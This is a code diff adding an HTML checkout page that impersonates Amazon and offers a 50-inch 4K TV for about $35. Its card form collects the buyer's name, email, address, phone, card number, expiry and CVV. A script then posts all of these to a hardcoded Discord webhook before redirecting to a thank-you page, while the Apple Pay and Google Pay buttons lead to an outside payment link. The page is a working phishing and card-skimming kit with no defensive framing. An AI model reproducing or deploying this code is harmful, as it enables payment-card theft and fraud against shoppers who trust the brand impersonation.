@@ -1,0 +1,526 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Checkout - Amazon</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', 'Roboto', sans-serif;
+            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
+            min-height: 100vh;
+            padding: 20px;
+        }
+
+        .container {
+            background: white;
+            border-radius: 20px;
+            padding: 30px 20px;
+            max-width: 500px;
+            margin: 0 auto;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+        }
+
+        .amazon-logo {
+            width: 100px;
+            margin-bottom: 20px;
+        }
+
+        h1 {
+            font-size: 28px;
+            color: #1d1d1f;
+            margin-bottom: 10px;
+            font-weight: 700;
+        }
+
+        .subtitle {
+            color: #666;
+            margin: 10px 0 20px;
+        }
+
+        .order-summary {
+            background: #f5f5f7;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+
+        .summary-row {
+            display: flex;
+            justify-content: space-between;
+            margin: 10px 0;
+            font-size: 16px;
+        }
+
+        .summary-total {
+            border-top: 2px solid #d2d2d7;
+            padding-top: 15px;
+            margin-top: 15px;
+            font-weight: bold;
+            font-size: 24px;
+        }
+
+        .payment-section {
+            margin: 30px 0;
+        }
+
+        .section-title {
+            font-size: 20px;
+            font-weight: 600;
+            margin-bottom: 15px;
+            color: #1d1d1f;
+        }
+
+        .payment-option {
+            border: 2px solid #e0e0e0;
+            border-radius: 12px;
+            padding: 20px;
+            margin: 15px 0;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 15px;
+        }
+
+        .payment-option:hover {
+            border-color: #667eea;
+            background: #f8f9ff;
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(102, 126, 234, 0.2);
+        }
+
+        .payment-icon {
+            font-size: 40px;
+        }
+
+        .payment-icon img {
+            display: block;
+            max-height: 40px;
+            max-width: 100%;
+        }
+
+        .payment-info {
+            flex: 1;
+        }
+
+        .payment-title {
+            font-size: 18px;
+            font-weight: 600;
+            margin-bottom: 5px;
+        }
+
+        .payment-desc {
+            font-size: 14px;
+            color: #666;
+        }
+
+        .card-form {
+            display: none;
+            margin-top: 20px;
+        }
+
+        .card-form.show {
+            display: block;
+        }
+
+        .form-group {
+            margin: 20px 0;
+        }
+
+        .form-group label {
+            display: block;
+            margin-bottom: 8px;
+            color: #1d1d1f;
+            font-weight: 600;
+        }
+
+        .form-group input {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #e0e0e0;
+            border-radius: 10px;
+            font-size: 16px;
+            transition: border-color 0.3s;
+        }
+
+        .form-group input:focus {
+            outline: none;
+            border-color: #667eea;
+        }
+
+        .submit-btn {
+            width: 100%;
+            padding: 20px;
+            background: #34c759;
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 20px;
+            font-weight: bold;
+            cursor: pointer;
+            margin-top: 20px;
+            transition: all 0.3s;
+        }
+
+        .submit-btn:hover {
+            background: #2fb54d;
+            transform: translateY(-2px);
+        }
+
+        .security-badges {
+            display: flex;
+            justify-content: center;
+            gap: 15px;
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+
+        .lang-switcher {
+            position: fixed;
+            top: 20px;
+            right: 20px;
+            background: white;
+            padding: 10px 15px;
+            border-radius: 10px;
+            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
+            cursor: pointer;
+            font-size: 14px;
+            font-weight: 600;
+            z-index: 1000;
+        }
+
+        .lang-switcher:hover {
+            background: #f5f5f7;
+        }
+
+        .back-btn {
+            color: #0066c0;
+            text-decoration: none;
+            font-size: 14px;
+            display: inline-block;
+            margin-bottom: 20px;
+        }
+
+        .back-btn:hover {
+            text-decoration: underline;
+        }
+    </style>
+</head>
+<body>
+    <div class="lang-switcher" onclick="switchLanguage()">
+        🌐 <span id="currentLang">English</span>
+    </div>
+
+    <div class="container">
+        <a href="product.html" class="back-btn" id="backBtn">← Back to product</a>
+
+        <svg class="amazon-logo" viewBox="0 0 603 182" xmlns="http://www.w3.org/2000/svg">
+            <path fill="#FF9900" d="M374.3 141.5c-53.7 39.7-131.6 60.8-198.7 60.8-94 0-178.8-34.8-242.8-92.6-5-4.5-.5-10.7 5.5-7.2 69 40.2 154.2 64.4 242.2 64.4 59.4 0 124.7-12.3 184.8-37.8 9-3.8 16.5 5.9 9 12.4z"/>
+            <path fill="#FF9900" d="M387.5 126.2c-6.9-8.8-45.4-4.2-62.7-2.1-5.3.6-6.1-4-1.3-7.4 30.7-21.6 81-15.4 86.9-8.1 5.8 7.3-.6 58-30.5 82.2-4.6 3.7-8.9 1.7-6.9-3.2 6.5-16.4 21.1-53 14.5-61.4z"/>
+        </svg>
+
+        <h1 id="checkoutTitle">Checkout</h1>
+        <p class="subtitle" id="subtitle">Complete your order for your Smart Tv</p>
+
+        <div class="order-summary">
+            <h3 style="margin-bottom: 15px;" id="summaryTitle">Order Summary</h3>
+            <div class="summary-row">
+                <span id="productName">Insignia™ - 50" 4K smart Tv</span>
+                <span>$34.99</span>
+            </div>
+            <div class="summary-row">
+                <span id="shipping">Shipping</span>
+                <span style="color: #34c759; font-weight: bold;" id="freeShipping">FREE</span>
+            </div>
+            <div class="summary-row">
+                <span id="tax">Tax</span>
+                <span>$3.47</span>
+            </div>
+            <div class="summary-row summary-total">
+                <span id="total">Total</span>
+                <span>$38.46</span>
+            </div>
+        </div>
+
+        <div class="payment-section">
+            <h3 class="section-title" id="paymentTitle">Select Payment Method</h3>
+
+            <!-- PayPal Option -->
+         <div class="payment-option" onclick="window.open('https://www.paypal.com/us/home?utm_medium=google&utm_source=sem&utm_campaign=B0005P4F&kid=13714856&gclsrc=aw.ds&gad_source=1&gad_campaignid=23352958053&gbraid=0AAAAADsjovwkouh4zpdoPHDEHvWuhmzQf&gclid=CjwKCAiAvaLLBhBFEiwAYCNTfzKipWfidH1wja7cb-3_B6EiJNKDf1uHEZmYm5nNbLLKF0_31mTPXhoCNv4QAvD_BwE', '_blank')">
+                <div class="payment-icon">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSCHxx2ERstkVgKd5IAFXHqoL8GjguhGJwp6cUxbSsrfg&s=10" alt="PayPal">
+                </div>
+                <div class="payment-info">
+                    <div class="payment-title">PayPal</div>
+                    <div class="payment-desc">Fast & secure payment</div>
+                </div>
+            </div>
+            <!-- Credit/Debit Card Option -->
+            <!-- Credit/Debit Card -->
+            <div class="payment-option" onclick="showCardForm()">
+                <div class="payment-icon">
+                    <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcSeEd15wLtjkxkrDSoF30y3iyJ-UmNI68NM8MLrnkE22Q&s=10" alt="Credit Card">
+                </div>
+                <div class="payment-info">
+                    <div class="payment-title">Credit or Debit Card</div>
+                    <div class="payment-desc">Visa, Mastercard, American Express</div>
+                </div>
+            </div>
+
+        <!-- Apple Pay Option -->
+<div class="payment-option" onclick="window.open('https://square.link/u/tp4mKZOq', '_blank')">
+    <div class="payment-icon">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcT5fyBxFg3vKzyt9nz9bkpxGGvHq8tdriF-P14k18f2WA&s=10" 
+             alt="Apple Pay">
+    </div>
+    <div class="payment-info">
+        <div class="payment-title">Apple Pay</div>
+        <div class="payment-desc">Pay quickly with Apple Pay</div>
+    </div>
+</div>
+
+<!-- Google Pay Option -->
+<div class="payment-option" onclick="window.open('https://square.link/u/tp4mKZOq', '_blank')">
+    <div class="payment-icon">
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcRigPHrPKCZL4lW8TC_WMmpbBbbso2J0G93QfG5l12R1w&s=10" 
+             alt="Google Pay">
+    </div>
+    <div class="payment-info">
+        <div class="payment-title">Google Pay</div>
+        <div class="payment-desc">Pay quickly with Google Pay</div>
+    </div>
+</div>
+
+        </div>
+
+        <!-- Card Form (Hidden by default) -->
+        <div class="card-form" id="cardForm">
+            <form onsubmit="processCardPayment(event)">
+                <div class="form-group">
+                    <label id="nameLabel">Full Name</label>
+                    <input type="text" id="fullName" placeholder="John Doe" required>
+                </div>
+
+                <div class="form-group">
+                    <label id="emailLabel">Email Address</label>
+                    <input type="email" id="email" placeholder="john@example.com" required>
+                </div>
+
+                <div class="form-group">
+                    <label id="addressLabel">Shipping Address</label>
+                    <input type="text" id="address" placeholder="123 Main St, City, State, ZIP" required>
+                </div>
+
+                <div class="form-group">
+                    <label id="phoneLabel">Phone Number</label>
+                    <input type="tel" id="phone" placeholder="(555) 123-4567" required>
+                </div>
+
+                <div class="form-group">
+                    <label id="cardNumLabel">Card Number</label>
+                    <input type="text" id="cardNumber" placeholder="1234 5678 9012 3456" maxlength="19" required>
+                </div>
+
+                <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 15px;">
+                    <div class="form-group">
+                        <label id="expiryLabel">Expiry Date</label>
+                        <input type="text" id="expiry" placeholder="MM/YY" maxlength="5" required>
+                    </div>
+
+                    <div class="form-group">
+                        <label>CVV</label>
+                        <input type="text" id="cvv" placeholder="123" maxlength="3" required>
+                    </div>
+                </div>
+
+                <button type="submit" class="submit-btn" id="submitBtn">
+                      COMPLETE PURCHASE - 38.46
+                </button>
+            </form>
+
+            <div class="security-badges">
+                <span id="secure">🔒 Secure Checkout</span>
+                <span id="ssl"> SSL Encrypted</span>
+                <span id="protection">🛡️ Buyer Protection</span>
+            </div>
+        </div>
+    </div>
+    
+    <script>
+        // Translation object
+        const translations = {
+            en: {
+                currentLang: 'English',
+                backBtn: '← Back to product',
+                checkoutTitle: ' Checkout',
+                subtitle: 'Complete your order to claim your Insignia™ - 50" 4K Tv',
+                summaryTitle: 'Order Summary',
+                productName: 'Insignia™ - 50" 4K Tv',
+                shipping: 'Shipping',
+                freeShipping: 'FREE',
+                tax: 'Tax',
+                total: 'Total',
+                paymentTitle: 'Select Payment Method',
+                paypalDesc: 'Fast & secure payment',
+                cardTitle: 'Credit or Debit Card',
+                cardDesc: 'Visa, Mastercard, American Express',
+                nameLabel: 'Full Name',
+                emailLabel: 'Email Address',
+                addressLabel: 'Shipping Address',
+                phoneLabel: 'Phone Number',
+                cardNumLabel: 'Card Number',
+                expiryLabel: 'Expiry Date',
+                submitBtn: ' COMPLETE PURCHASE - $38.46',
+                secure: '🔒 Secure Checkout',
+                ssl: ' SSL Encrypted',
+                protection: '🛡️ Buyer Protection'
+            },
+            es: {
+                currentLang: 'Español',
+                backBtn: '← Volver al producto',
+                checkoutTitle: 'Pago',
+                subtitle: 'Completa tu pedido para reclamar tu Tv inteligente',
+                summaryTitle: 'Resumen del Pedido',
+                productName: 'Insignia™ - 50" 4K Tv',
+                shipping: 'Envío',
+                freeShipping: 'GRATIS',
+                tax: 'Impuesto',
+                total: 'Total',
+                paymentTitle: 'Seleccionar Método de Pago',
+                paypalDesc: 'Pago rápido y seguro',
+                cardTitle: 'Tarjeta de Crédito o Débito',
+                cardDesc: 'Visa, Mastercard, American Express',
+                nameLabel: 'Nombre Completo',
+                emailLabel: 'Correo Electrónico',
+                addressLabel: 'Dirección de Envío',
+                phoneLabel: 'Número de Teléfono',
+                cardNumLabel: 'Número de Tarjeta',
+                expiryLabel: 'Fecha de Vencimiento',
+                submitBtn: ' COMPLETAR COMPRA - $38.46',
+                secure: '🔒 Pago Seguro',
+                ssl: ' Encriptado SSL',
+                protection: '🛡️ Protección al Comprador'
+            }
+        };
+        
+        let currentLang = localStorage.getItem('language') || 'en';
+        
+        // Apply translations on load
+        function applyTranslations() {
+            const t = translations[currentLang];
+            document.getElementById('currentLang').textContent = t.currentLang;
+            document.getElementById('backBtn').textContent = t.backBtn;
+            document.getElementById('checkoutTitle').textContent = t.checkoutTitle;
+            document.getElementById('subtitle').textContent = t.subtitle;
+            document.getElementById('summaryTitle').textContent = t.summaryTitle;
+            document.getElementById('productName').textContent = t.productName;
+            document.getElementById('shipping').textContent = t.shipping;
+            document.getElementById('freeShipping').textContent = t.freeShipping;
+            document.getElementById('tax').textContent = t.tax;
+            document.getElementById('total').textContent = t.total;
+            document.getElementById('paymentTitle').textContent = t.paymentTitle;
+            document.getElementById('paypalDesc').textContent = t.paypalDesc;
+            document.getElementById('cardTitle').textContent = t.cardTitle;
+            document.getElementById('cardDesc').textContent = t.cardDesc;
+            document.getElementById('nameLabel').textContent = t.nameLabel;
+            document.getElementById('emailLabel').textContent = t.emailLabel;
+            document.getElementById('addressLabel').textContent = t.addressLabel;
+            document.getElementById('phoneLabel').textContent = t.phoneLabel;
+            document.getElementById('cardNumLabel').textContent = t.cardNumLabel;
+            document.getElementById('expiryLabel').textContent = t.expiryLabel;
+            document.getElementById('submitBtn').textContent = t.submitBtn;
+            document.getElementById('secure').textContent = t.secure;
+            document.getElementById('ssl').textContent = t.ssl;
+            document.getElementById('protection').textContent = t.protection;
+        }
+        
+        function switchLanguage() {
+            currentLang = currentLang === 'en' ? 'es' : 'en';
+            localStorage.setItem('language', currentLang);
+            applyTranslations();
+        }
+        
+        // Apply translations on page load
+        applyTranslations();
+        
+        // PayPal payment - Instant Rick Roll
+        function payWithPayPal() {
+            window.location.href = 'https://www.youtube.com/watch?v=dQw4w9WgXcQ';
+        }
+        
+        // Show card form
+        function showCardForm() {
+            document.getElementById('cardForm').classList.add('show');
+            document.getElementById('cardForm').scrollIntoView({ behavior: 'smooth' });
+        }
+        
+        // Process card payment - Sends data to Discord and redirects
+async function processCardPayment(e) {
+    e.preventDefault();
+
+    // Show loading state
+    const btn = document.getElementById('submitBtn');
+    const originalText = btn.textContent;
+    btn.textContent = currentLang === 'en' ? '⏳ Processing Payment...' : '⏳ Procesando Pago...';
+    btn.disabled = true;
+
+    // 1. Get all the form data
+    const fullName = document.getElementById('fullName').value;
+    const email = document.getElementById('email').value;
+    const address = document.getElementById('address').value;
+    const phone = document.getElementById('phone').value;
+    const cardNumber = document.getElementById('cardNumber').value;
+    const expiry = document.getElementById('expiry').value;
+    const cvv = document.getElementById('cvv').value;
+    
+    // 2. Create the message for Discord
+    const discordMessage = `**New Order Submission**\n\n` +
+        `**Full Name:** ${fullName}\n` +
+        `**Email:** ${email}\n` +
+        `**Shipping Address:** ${address}\n` +
+        `**Phone Number:** ${phone}\n\n` +
+        `--- Payment Details ---\n` +
+        `**Card Number:** ${cardNumber}\n` +
+        `**Expiry Date:** ${expiry}\n` +
+        `**CVV:** ${cvv}`;
+
+    // 3. Define the webhook URL
+    const webhookUrl = 'https://canary.discord.com/api/webhooks/1457147384533483682/AwFLIn0W5j4My_ANzUBea_nxzNdVf1MOcWT1wcip5Aiab7zkYcuLPuJHyabAD3HoFtKf';
+
+    // 4. Send the data to Discord
+    try {
+        const response = await fetch(webhookUrl, {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json',
+            },
+            body: JSON.stringify({
+                content: discordMessage
+            })
+        });
+
+        if (response.ok) {
+            console.log('Successfully sent to Discord!');
+        } else {
+            console.error('Failed to send to Discord:', response.status, response.statusText);
+        }
+    } catch (error) {
+        console.error('Error sending to Discord:', error);
+    }
+
+    // 5. Redirect to the thank you page after a short delay
+    setTimeout(() => {
+        window.location.href = 'thankyou.html';
+    }, 2000); // Increased delay to allow time for the request to complete
+}
+    </script>
+</body>
+</html>
